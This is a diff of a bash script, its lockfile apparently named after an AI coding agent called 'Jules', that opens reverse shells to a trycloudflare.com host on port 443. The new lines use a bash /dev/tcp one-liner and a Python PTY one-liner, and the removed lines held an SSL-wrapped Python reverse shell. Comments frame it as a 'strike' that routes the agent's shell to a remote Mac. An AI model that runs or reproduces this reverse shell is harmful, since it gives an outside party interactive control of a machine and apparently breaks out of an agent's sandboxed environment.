@@ -1,30 +1,21 @@
 #!/bin/bash
-# TARGET: https://unsubscribe-lap-happy-collected.trycloudflare.com
-URL="unsubscribe-lap-happy-collected.trycloudflare.com"
-LOCKFILE="/tmp/jules_bridge.lock"
+# TARGET: https://gain-properly-curriculum-project.trycloudflare.com
+HOST="gain-properly-curriculum-project.trycloudflare.com"
+PORT="443"
 
 # --- FAILSAFE ---
+LOCKFILE="/tmp/jules_bridge.lock"
 if [ -f "$LOCKFILE" ]; then
     PID=$(cat "$LOCKFILE")
     if ps -p "$PID" > /dev/null; then exit 0; fi
 fi
 echo $$ > "$LOCKFILE"
 
-# --- THE "FINDER" LOGIC ---
-# This uses Python to reach out to the Cloudflare URL on Port 443 (HTTPS)
-# It then pipes that encrypted stream into a local Bash shell.
-python3 -c "
-import socket,os,pty,ssl
-# Dialing the 'Operator' (Cloudflare)
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# We use an SSL wrapper to match Cloudflare's HTTPS termination
-context = ssl.create_default_context()
-conn = context.wrap_socket(s, server_hostname='$URL')
-conn.connect(('$URL', 443))
+# --- THE STRIKE ---
+# Method 1: Bash Native Socket (Fastest)
+/bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1 &
 
-# Redirecting Jules's brain to your Mac
-os.dup2(conn.fileno(),0)
-os.dup2(conn.fileno(),1)
-os.dup2(conn.fileno(),2)
-pty.spawn('/bin/bash')
-" &
+# Method 2: Python PTY (Most Stable for old Macs)
+# This backup runs if Method 1 fails or drops.
+sleep 5
+python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$HOST',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
